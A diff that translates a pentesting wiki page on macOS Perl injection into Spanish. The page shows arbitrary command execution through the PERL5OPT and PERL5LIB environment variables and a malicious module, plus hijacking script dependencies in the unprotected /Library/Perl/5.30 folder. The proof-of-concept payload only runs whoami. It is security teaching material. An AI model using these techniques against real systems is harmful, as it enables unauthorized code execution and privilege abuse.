@@ -1,49 +1,38 @@
-# macOS Perl Applications Injection
+# Inyección de Aplicaciones Perl en macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## A través de la variable de entorno `PERL5OPT` & `PERL5LIB`
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
-
+Usando la variable de entorno PERL5OPT, es posible hacer que perl ejecute comandos arbitrarios.\
+Por ejemplo, crea este script:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-
-Now **export the env variable** and execute the **perl** script:
-
+Ahora **exporta la variable de entorno** y ejecuta el **script perl**:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
-
+Otra opción es crear un módulo de Perl (por ejemplo, `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-
-And then use the env variables:
-
+Y luego usa las variables de entorno:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## A través de dependencias
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+Es posible listar el orden de la carpeta de dependencias de Perl en ejecución:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+Lo que devolverá algo como:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -55,15 +44,14 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+Algunas de las carpetas devueltas ni siquiera existen, sin embargo, **`/Library/Perl/5.30`** **existe**, **no está** **protegida** por **SIP** y está **antes** de las carpetas **protegidas por SIP**. Por lo tanto, alguien podría abusar de esa carpeta para agregar dependencias de script allí para que un script Perl de alto privilegio lo cargue.
 
 > [!WARNING]
-> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+> Sin embargo, ten en cuenta que **necesitas ser root para escribir en esa carpeta** y hoy en día recibirás este **mensaje de TCC**:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+Por ejemplo, si un script está importando **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` para hacer que ejecute código arbitrario.
 
 ## References
 
